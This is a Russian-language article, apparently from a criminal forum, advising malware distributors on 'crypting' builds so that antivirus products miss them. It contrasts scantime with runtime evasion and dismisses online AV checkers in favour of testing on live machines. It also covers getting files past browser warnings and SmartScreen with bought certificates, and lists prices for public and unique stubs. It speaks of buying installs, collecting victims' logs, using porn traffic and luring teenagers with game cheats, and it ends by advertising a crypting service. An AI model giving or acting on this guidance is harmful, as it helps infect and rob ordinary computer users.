Если у вас варит мозг или уже есть опыт, то вы должны сходу подумать о том, что криптованный файл надо где-то проверять на работоспособность и способность обходить системы защиты, в частности антивирусов. И если проверять файл на тот же прогруз - это быстро и просто, то вот проверить файл на обход защиты антивирусов, коих десятка 3 наберется, уже задача, мягко говоря, проблемная.

Именно поэтому были придуманы разного рода чекеры на вирусы – от общеизвестного ВирусТотала (ВТ), который сливает всё врагам (логично - это его работа), до якобы теневых чекеров, которые ничего не сливают (авчек, сканмайбин и динчек).

Логика работа простая – вы загружаете файл, отмечаете галочками АВ, которые вас интересует. Жмякаете кнопочку и дожидаетесь результатов проверки. У сервиса динчека (единственного) есть так же возможность проверки на рантайм – можно настроить параметры и проверить, как поведет себя ваш файл при запуске. 

Важнейшее замечание #1 – 90% сервисов рантаймом не занимаются. Почему? Об этом в дальнейшем.
Важнейшее замечание #2 – вы удивитесь, но большинство хомячков даже не знает о таком параметре как рантайм. Во-первых, потому что смотри пункт 1. Во-вторых, потому что проверить его можно автоматически только на динчеке, а это достаточно дорого (3.5 бакса разово или подписка от 50 долларов в неделю).
Важнейшее замечание #3 – подтвердить не могу, но кажись авчек сливает инфу «налево». Слишком быстро стали дохнуть файлы, когда я с ним работал. За динчеком такого не замечено. 
Проверяем крипт на качество – шаг второй
Внимание! ВСЕ чекеры на АВ – это глобальный развод и афера века

Товарищ, прежде чем ты побежал, высунув язык, проверять свой крипт на том же динчеке, прочитай эту статью, особенно текущий параграф и твой мир перевернётся.

Итак, я не буду ходить вокруг да около. Если ты уже успел посетить форумы, специализирующих на определенных услугах а-ля крипт файла, то ты мог заметить, что везде мерилом успеха является нулевые детекты на скантайм через динчек (обычно используют его все). Кто-то называется это FUD=0, кто-то по другому, но суть простая – файл проверяется где-то и с важным видом вам показывают ссылку типа «вот, по нулям, получи и распишись».

Создатели софта обычно показывают статистику по рантайму а-ля: «У нас всего N детектов, всё круто и классно».

А я вся мякотка в том, что данные, которые показывают чекеры НЕВЕРНЫЕ! 

Важнейшее замечание #4 – Я не знаю, почему так, врать не буду. Ибо не изучал, как устроены чекеры и на каких алгоритмах работают. По крайней мере если есть детекты, то тут чекеры правдивы с вероятностью 80-90% Но в ином случае они критически расходятся с тем, что есть в реальности. Если у кого-то есть предположения/данные – пишите в личку, пообщаемся. 
Всё началось в своё время с того, что антивирусы на машинах, детектили файл там, где его детектить нельзя было по умолчанию, ибо все чекеры показывали, что файл чистый.

«Что за хрень?» - подумал я, и мы решили углубиться в этот вопрос глубже.

1) Было создано 15 машин на WIN 10, на которых были поставлены 15 официальных антивирусов.

2) Мы перебрали большинство известных паблик и полу-паблик сервисов по крипту и протестировали его в живых условиях. Именно живых. Взяв файл и лично прокачав его через браузер на машину и попробовав запустить.

Вывод для scantime и Runtime - расхождение составило до 80% при живой проверке
Еще раз. В восьми случаях из 10 там, где чекеры показывали, что всё чисто, в реальности наблюдался детект! Особенно на топовых антивирусах типа аваста, нода, есета и прочих.

Так как я уже прямо ощущаю, что у читающих начинает гореть пукан и руки, готовы набирать гневные сообщения про «их личный отстук в 90%», я сразу внесу определенные корректировки.

Позвольте, приведу примерчик-с.
Сделал я, господа, криптик-с своего файла. Прогружается, голубчик, всё с ним славно и благостно. Решил я со своей родной машинки его скачать. Ну а что? Дюже лишняя проверка не помешает. Да и стоит у меня на моей родной машинке AVAST, собака такая, ни одну гадость не пропускает. И тут, господа, качаю я файлик, а он, зараза такая, детектится! Ну, я не лыком шитый, опять быстренько делаю проверку на скантайм – всё чисто, мать его итить!

От собака! Взял я парочку дедиков на десяточке, поставил туда AVAST, убил, господа, пол-дня. Качаю – детекты! Детекты, итить мать его за ногу! А чекер показывает, что всё чисто!

Я это к чему, если вы лично проверяете файл на живой машине с определённым АВ, или даже на нескольких машинах с тем же самым АВ, и вам усиленно лезет табличка о наличии дряни в файле – то ваши выводы? Кто прав – чекер или ваши личные наблюдения? Вопрос оставлю открытым.

До сих пор не согласны со мной? Тогда читайте дальше, я рассмотрю этот вопрос дополнительно в разделе «Как тогда работают все, при таких детектах»?

Проверяем крипт на качество – шаг третий
Итак, если я вам пошатнул картину мира, и вы решили сами проверить мои слова на истину. То ваш следующий шаг простой – вам нужно сделать/купить минимум 10 машин (топ 10 антивирусов вполне обеспечить охват в 90%) и криптованный билд лично проверять на детекты.

Да, ручками. Да, вот таким вот геморройным образом. Но только так вы сможете убедиться в качестве работы, которую вам сделали!

Аналогично, проверяйте и рантайм. И вы сможете увидеть реальную картину мира, а затем подсчитать приблизительные потери при отстуке файла.

И наконец – никто не мешает использовать чекеры для косвенной оценки «уровня жизни крипта». А если после прогруза в динчеке начали появляться детекты, то с вероятностью 80-90% это так и есть.

Важнейшее замечание #5 – Почему крипторы тогда игнорируют столько явные расхождения данных? Моё мнение, что проверка подобным образом 1) слишком муторная 2) её невозможно доказать клиенту. Ибо бывает и обратная ситуация, когда чистый на живых машинах файл, почему-то усиленно показывается на динчеке как зараженный. Клиенту этого не доказать, да и кому это нужно? 
Важнейшее замечание #6 – С технической точки зрения сделать чистый скантайм, основываясь на показателях ЖИВЫХ машин ничуть не сложнее, чем сделать чистый скантайм под динчек. Но в данном случае непонимание клиентов, приводит к тому, что крипторам проще скармливать ложные данные о детектах. И все довольны.   
В чём разница между скантаймом и рантаймом?
В данном посте я сразу отвечаю на 2 конкретных вопроса:

~ Что из себя вообще представляет процесса крипта файла?

~ Почему 99% крипторов не занимаются райнтаймом?

Итак. Давайте очень упростим для скорости, иначе тут можно смело кybue садиться писать.

Чтобы сделать крипт, прежде всего, нужен некий «криптографический модуль». Который покупается, либо делается с нуля. Дальше на основе этого модуля создаётся стаб (упрощаю объяснение как могу без лишней теории). Ну а дальше можно сажать любую обезьяну, которая будет нажимать на кнопку, и получать готовый файл.

Поэтому если вы встречаете саппорта, который вообще ни в зуб ногой в теме и орёт матами, какие все тупые – то обезьянЪ детектед. Человека просто посадили нажимать кнопку и на этом всё. Больше вам он ничем не поможет.

Важнейшее замечание #7 – Конечно, полученный стаб будет постепенно выходить из строя и его придется чистить, апгрейдить и подгонять под изменяющуюся среду. Что уже не самая простая задача. 
А теперь внимание!
Всё вышеперечисленное справедливо ТОЛЬКО для скантайма. Ибо модулей, которые бы позволили автоматически криптовать файлы под рантайм не существует ввиду разницы в … назовём это так … технологической природе процесса. И выходит, что чистить рантайм - это строго ручная и кропотливая работа.

Важнейшее замечание #8 – Ввиду трудозатратности и средней цены за крипт на рынке (20-50 баксов), сервисам заниматься чисткой рантайма никакого смысла нету. Логичный вопрос на тему: «На кой хер нужен чистый скантайм, если там по рантайму 100500 детектов?» перенесем в следующую тему.
Что такое рантайм?
Повторимся. Рантайм – это когда вы запускаете файл, антивирус сканирует его и убеждается, что опасности процесс не представляет. А файл между тем делает свои темные делишки. Уже исходя из этого, можно убедиться, что процесс чистки рантайна намного сложнее, чем сделать чистый скантайм. И чистка рантайма никакого отношения к крипту НЕ ИМЕЕТ.

Рантайм не использует алгоритмы того самого модуля, который используется для крипта на скантайм. Опять же – чистота рантайма большей частью зависит от чистоты билда, которым занимается создатель вашего софта. Рантайм бывает двух типов – static detect и dynamic detect.

Крипт на скантайм и рантайм – это совершенно две разные операции, лежащие в совершенно разных областях! И они никак не пересекаются между собой.

Условно крипт на рантайм делается так:

1) Изучаются алгоритмы работы АВ

2) Изучается методы сканирования

3) Находятся слабые места сканирования

4) Файл «чистится»

Как вы понимаете, у любого АВ нету магической кнопки «декомпилировать файл и залезть в кишки», иначе любые ухищрения были бы бесполезны. 

Поэтому при запуске файла проводится, грубо говоря, «первичная обработка» данных по установленным у АВ алгоритмам. Задача криптора выявить их и обойти. Далее файл, скорее всего, отправится на углублённое обследование в конторку. А потом ваш крипт сдохнет и всё придется начинать с начала. В это окошко как раз и надо работать. У уникального качественного крипта оно может растянуться на долгие дни.

Важнейшее замечание #9 – Именно поэтому критически острой проблемой становится чистота базового билда софта. Ибо вычистить файл при наличии исходников в миллион раз легче, чем чистить уже готовый билд и убирать детекты на рантайм.
Важнейшее замечание #10 - Несмотря на это – вполне реально убрать 3-5 детектов на рантайм. Зависит от того какой АВ палится. При относительно чистом билде и рукастом крипторе можно довести реальный рантайм-показатель до 1-3. 
Почему 99% крипто-сервисов на рынке – это бесполезная пустышка. Спрашивали? Отвечаем!
Обидеть никого не хочу, пост несет нейтральный оттенок. У одних бизнес, у других информация об этом бизнесе.

Итак, исходя из вышеуказанного, берем 3 пункта:

~ Разница между показанием чекера (авчек/динчек/сканмайбин) и реальными данными. Разница может быть настолько критической (особенно если стаб старый и не обновлялся давно), что смысл крипта как крипта вообще пропадает.

~ Отсутствие крипта под рантайм. Если билд сам по себе уже воняет как тухлое яйцо и реальные детекты на рантайм перевалили далеко за 6-7, то смысл даже от идеально чистого скантайм крипта? Самые популярные 7-8 АВ составляют примерно 80-90% общемировых использований.

~ Ну и конечно, мало кто будет использовать дорогой уник стаб (который еще хрен кто сделает), что вообще сводит толк от крипта к нулю.

Важнейшее замечание #11 - Опять же, есть вполне себе адекватные сервисы, которые делают крипт под скантайм таким же методом, как я описал. Берут машины, ставят туда АВ и чекают ручками – детектиться или нет. К сожалению, в паблик такие сервисы выходят редко, ввиду проблем указанных мною ранее. Никому не хочется объяснять тупым обезьянам, почему чекерам верить не стоит. 
Как определить сервисы/специалистов, с которыми работать не надо?

~ На вопрос о рантайме либо впадает в ступор, либо говорит, что это не их проблема – адекватный сервис объяснит, что они этим не занимаются и за чистотой рантайма должен следить создатель софта. Крутой сервис – почистит рантайм при адекватно чистом билде.

~ Плюётся ядом при прочтении этой статьи и говорит, что это всё ложь и неправда.

~ При вопросе «Почему такой якобы чистый крипт палится на живой машине?» начинается вести себя неадекватно и брызгает говном.

Логичный вопрос – почему тогда вообще идут инсталлы и люди с ними работают? Некоторые так даже вполне себе успешно.
Это хороший вопрос и я считаю, обязательно нужно разобрать его!

Прежде всего, определимся с критическим нюансом. Вы получаете инсталлы со своего трафика или покупаете их?

В первом случае, вы услышите распространённую байку на тему: «Лить трафик на exe файл бесполезно, его никто не качает, всё херня, это уже прошлый век». Либо услышите много грустных историй на тему низкого конверта. Либо услышите, как тяжело лить файлы, потому что «конверт не радует».

Это логично – подобный крипт порежет практически весь конверт в 5-10 раз. Поверьте, хороший ленд под порно-трафик, будет давать 10-15% конверта как родной. При хорошем трафике, конечно. Но вместо 10-15 инсталлов со 100 кликов, вы получите с трудом-бегом 1-2-3 инсталла.

Покупая инсталлы, картина другая. Прежде всего, большая часть трафика там мотивированная. И школота будет плевать на все алерты АВ и активно ставить софт в надежде на читы от CS или GTA. В остальном имеется так называемая «систематическая ошибка выжившего».

Важнейшее замечание #12 - Посмотрите снимок с экрана рабочего стола ваших инсталлов. Вы увидите, что большая часть машин либо вообще ничем не защищена, либо имеют АВ неясного происхождения. Вы крайне редко увидите логи с таким АВ как есет, авира, коммодо, аваст и т.д. 
Важнейшее замечание #13 – В ходе работы, если вы искренне считаете ваш крипт хороший, то вы, скорее всего, уже попали в систематическую ошибку выжившего. Погуглите, вникните. Возможно, это поможет посмотреть на «картину мира» под другим углом.
Разница между «уник» и «паблик» стабом
Как я уже писал, нынешний крипт с точки зрения школоты и прочей шудры, разве что не лечит от онкологии последней стадии. А еще даёт просветление и генерирует биткоины каждый день. Крипторы охреневают от подобных предъяв, и паблик рынок лишается последних адекватных профессионалов.

Прежде всего «уник стаб» подразумевается тем, что он сделан индивидуально под необходимое вам ПО. Для тех, кто еще не понял: модуль – стаб – крипт. Таким образом, если предположить что криптор «создал» уник стаб под конкретного клиента, исходя из показателей «живых машин» и свёл его в FUD=0 по скантайму.  То вы можете взять билд, запихать его в архив под паролем, подержать недельку на облаке, потом достать, чекнуть и там по прежнему будет FUD=0

Важнейшее замечание #14 – Не забывайте, что чек на живых АВ убивает крипт. Данный метод используется ТОЛЬКО для проверки качества криптосервиса, а не для постоянной проверки криптованного билда.
В свою очередь паблик «стаб» сделан по принципу – один для всех. И срок жизни такого крипта крайне ограничен. Поэтому его обычно делают сразу перед проливом и надеются, что он не сдохнет через 5 минут.

Важнейшее замечание #15 – Это вполне адекватный вариант для тех, кто покупает инсталлы и уверен в скорости пролива. Срок жизни паблик стаба – рандомный.
Ну и надо понимать, что у качественного уник-стаб под ваше ПО обычно ценник идет за аренду в месяц под безлимитный крипт файла. Ибо никому неинтересно, сколько вы там собираетесь раз его использовать. Цена от 1К и выше.

Прогруз файла в браузере
То, с чего начинается путь земной вашего файла. В идеале, должен быть без алертов а ля - файл опасный, файл потенциально опасный, файл редко скачивается, файл заблокирован. В ином случае, можете забыть про 99% отстука.

Прежде всего, надо понять две базовые вещи:

~ Прогруз самого файла в браузере от крипта НЕ ЗАВИСИТ! Обратное тоже верно – даже самый лучший крипт, прогрузу не поможет! Ибо это разные вещи. Совсем разные.

~ Проверка файла браузером и антивирусом – это две разные проверки.

Важнейшее замечание #16 – Еще раз. Вначале при загрузке файла идет проверка файла браузером (особенно когда файл грузится и мигает, крутиться значок загрузки). Затем после скачивания начинается проверка файла антивирусом (если этот модуль активен). 
Подготовить файл для прогруза в браузере задача сложная и многофакторная. И пути её решения, конечно же, никто палить не будет. Бонусом гугл тоже на месте не стоит и постоянно вводит новые условия. В общем и целом, для разрешения задачи нужно по минимуму иметь:

1)     Определенную подпись\сигнатуру

2)     Сертификат

3)     Крипт (ну это уже логика - ибо чистый билд лучше не палить в гугле)

4)     Чистый IP домена и хостинга

То есть, как вы заметили, крипт файла и подготовка уже криптованного файла для прогруза в браузере – задачи совершенно разные. Адекватный криптор с прямым руками может помочь в этой проблеме, но обычно не хочет. Почему? Спасибо школоте, которая начала это требовать чуть ли не с претензиями и истериками.

Важнейшее замечание #17 – крипт есть крипт. Прогруз есть прогруз. Не мешайте всё в кучу. Каждая задача требует отдельного решения. 
Смартскрин 
Последний рубеж обороны виндоус 10. Головная боль логоводов. И сомнительной полезности вещь для рядового пользователя.

В чем ее теоретическая суть? 

Судя по всему, система должна была проверять сертификацию файлов и брать на карандаш файлы без доверенного сертификата.

Что по факту?

По факту смартскрин работает как наркоман под смесью DMT, LSD и мухоморов. Блокирует хорошие файлы, пропускает плохие. Не обращает внимание на недоверенные файлы и ругается на файлы с валидной подписью. Причем совершенно рандомно.

В чем проблема?

В среднем около 30% машин имеют табличку от смартскрина «хотите установить файл? Подпись не удалось проверить». Конверт - это нормально так режет …

Как обойти?

Увы и ах, гарантированных методов обхода не существует. Обычный валидный сертификат, проблему не решает полностью. Как показала практика, использование валидного сертификата, кои продаются за 200-300 баксов, снижают появление окошка примерно в 1.5-2 раза. Стоит ли оно тех денег? Тут каждый решает сам.

Важнейшее замечание #18 –  Бывают ситуации, когда смартскрин не пропускает файл, который имеет валидную лицензию или цифровую подпись, купленную официально за кровные деньги. Это связано с тем, что загрузов этого файла слишком мало. Накрутка не поможет, можете не стараться.  Официально считается, что помогает лицензия разработчика расширенного образца. А так же бывают ситуации, когда файл без сертификата и подписи открывается без вопросов. Некоторые АВ, при открытии файла действуют именно по этой схеме, даже если он кристально чистый.
Как решить вопрос?

Опять же либо только смириться, либо использовать валидный сертификат. Можно попробовать купить самому – это существенно сэкономит средства. У комодо он стоит всего лишь 80-90 долларов. Дерзайте.

Политика ценообразование
Я всего лишь приведу собственные мысли на этот счет, исходя опять же из личного опыта. Может кому-то это поможет.

Цена за паблик-крипт (скантайм): 10-50$ В принципе цена зависит от используемого алгоритма и чистоты скантайма. Покупая крипт за 10 долларов, вы получаете соответствующее качество. Дороже крипт – лучше качество. Как показывает практика, крипторы, которые еще делают нормальный и адекватный паблик-крипт остались.

Вообще есть золотое правильно - крипт за 10-15 баксов, это не крипт, а имитация.

Так же уточняйте, у многих в цену крипта (которые стоят по 30-50$) в услугу может входить помощь с прогрузом. По крайне мере раньше входила, пока гугл с концами не пережал все гайки.

Цена за уник-крипт (скантайм+рантайм): тут надо понимать 2 варианта ситуации. Прежде всего криптор, который может сделать уник стаб, так же может почистить и рантайм. Но это не относится к крипту! Еще раз: рантайм никакого отношения к крипту не ИМЕЕТ! И услуга скорее всего должна будет оказываться совместно. Обычно разовый крипт под уник стаб стоит около 100$-150$ + очистка рантайма. Месячная аренда уник стаба под себя стоит 1-2К.

Важнейшее замечание #19 – цена на уник стаб исходит из трудозатрат. Как вы думаете кто вам будет покупать весьма нехило такой дорогой модуль, потом создавать стаб, отлаживать, чистить его и всё ради того, чтобы продавать вам крипт за 40-50$ Идиотов нет. Если вы думаете, что есть, то скорее всего идиот тут вы :)
Важнейшее замечание #20 – если вам предлагает уник-стаб за слишком дешевые деньги, то это обычный развод. Не попадайтесь на удочку мошенников. Крипт либо дешевый и простой. Либо дорогой и сложный. Серединки тут нет.
Цена за помощь с прогрузом: По нынешним меркам 20-40$ с учетом того, что подготовить файл дело не самое быстрое, в принципе адекватная цена. Другое дело, что задача это нудная в том плане, что своих денег не стоит. С третьей стороны – договориться всегда можно. Лишняя монетка никому не помешает.

Что делать по итогу?
Любимый вопрос всех и вся, который мне задают: «А что делать-то теперь?» Я более чем уверен, что 2/3 пролистали этот текст, понимая, что всё очень плохо и надо скорее прочитать конец «книги», чтобы найти готовый ответ.

В прошлой статье, меня чуть не сожрали в комментариях, потому что я расписал как всё на самом деле плохо и (злой такой дядя) не сказал, как сделать так, чтобы всё было хорошо.

Исправляюсь и предлагаю аж 3 варианта на выбор:

1)     Запасаемся деньгами, попкорном и идем искать всех крипторов на рынке. Составляем список. Уточняем, через что он проверяет скантайм. Сами обязательно проверяем крипт на живых машинах. Если расхождения нет – поздравляю! Если есть – пробуем договориться и предоставляем доказательства. Если не послали нахер – поздравляю! Если послали – ищем дальше.

Важнейшее замечание #21 – копание в говне обычно всегда даёт результаты! Не сдавайтесь. Адекватные крипторы есть, их надо просто найти.
2)     Ищем себе партнёра-техника, который разбираемся в азах этой всей бадяги. Ну, или который имеет навыки, чтобы разобраться. Уверяю, есть много хороших и умных ребят, которые так же сидят на форумах и ищут возможность влиться или создать команду.

Важнейшее замечание #22 – к этому времени нужно иметь хоть какую-то базу. Если вы сами нихера не знаете, не умеете и не имеете, то и к вам будет липнуть точно такая же шелупонь. А оно вам надо?
3)     В ближайшее время мы открываем свой крипто-сервис, оказывающий услуги по всем правилам работы. Как увидите торговую тему, то сразу, как говорится, милости просим. Так как статью не факт что буду обновлять, если что пишите по контактам: @Titanium_cash дам ссылку на актуальный сервис.

P.S. Не консультирую. Ссылки на сервисы не даю. Троллей игнорирую. За людей, у которых всё шикарно и они рубят лярды с отстуком 100%, а я плохой и вообще говно раз дезинформирую всех – рад.

